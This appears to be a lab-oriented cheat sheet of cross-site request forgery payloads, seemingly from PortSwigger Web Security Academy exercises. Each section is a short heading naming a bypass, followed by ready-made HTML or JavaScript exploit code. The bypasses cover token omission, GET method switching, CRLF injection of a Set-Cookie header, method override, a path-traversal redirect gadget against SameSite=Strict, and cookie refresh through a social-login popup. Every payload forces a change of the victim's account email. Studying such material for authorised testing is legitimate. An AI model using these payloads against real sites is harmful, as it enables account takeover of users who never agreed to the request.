CSRF TOKEN NOT TIED TO SINGLE SESSION COOKIE
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@gothacked">
            <input required type="hidden" name="csrf" value="CSRF">
            <button type="submit">Update Email</button>
        </form>
        <script>document.forms[0].submit()</script>
    </body>
</html>
```

CSRF TOKEN IS VALIDATED ONLY IF PRESENT, IF OMITTED THERE IS NO CONTROL
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
        <input required type="email" name="email" value="victim@yougothacked">
        <button type="submit">Update email</button>
    <script>document.forms[0].submit()</script>
    </body>
</html>
```

CSRF TOKEN CONTROL IS IMPLEMENTED ONLY ON POST REQUEST, SWITCHING TO GET METHOD AND STRIPPING THE CSRF PARAMETER FROM THE URL DOES BYPASS THE CONTROL
```html
<html>
    <body>
        <img src="URL/my-account/change-email?email=victim%40gothacked" onerror=alert(1)>
    </body>
</html>
```

CSRF TOKEN CONTROL DUPLICATED IN A COOKIE AND SOME USER INPUT IS REFLECTED IN THE SET-COOKIE HEADER
```html
<html>
    <body>
        <img src="URL/?search=test%0D%0ASet-Cookie%3A%20csrf%3Dfakecsrf%3B%20SameSite%3DNone" onerror=document.forms[0].submit()>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@yougothacked">
            <input required type="hidden" name="csrf" value="fakecsrf">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>
```


BYPASS SAME-SITE=LAX (NO CSRF TOKEN PRESENT) USING METHOD OVERRIDE
```html
<html>
    <body>
        <form action="https://URL/my-account/change-email" method="POST">
            <input type="hidden" name="httpMethod" value="GET">
            <input required type="email" name="email" value="yougot@hacked">
            <button type="submit">Submit</button>
        </form>
        <script>document.forms[0].submit()</script>
    </body>
</html>
```
Source: [sidechannel.blog](https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/)  

PORTSWIGGER VERSION
```html
<script>
    document.location="URL/my-account/change-email?email=youjustgot%40hacked&_method=POST"
</script>
```

BYPASS SAME-SITE=STRICT USING ON-SITE GADGETS (DOM OPEN-REDIRECT VULNERABLE OBJECTS)

```html
<script>
    document.location = "URL/post/comment/confirmation?postId=1/../../my-account/change-email?email=yougot%40hacked%26submit=1"
</script>
```

BYPASS SAME-SITE=LAX WITH NEWLY ISSUED COOKIES (120 SECONDS PERIOD OF GRACE FOR POSTS REQUEST) (csrf-lab09)

```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="youjustgot@hacked">
            <button type="submit">Submit</button>
        </form>

        <script>
            window.onclick= () => {
            window.open('https://0a3c000904d7333a802d94de00580052.web-security-academy.net/social-login');
            setTimeout(function(){
                document.forms[0].submit()
            }, 5000)
            }
        </script>
    </body>
</html>
```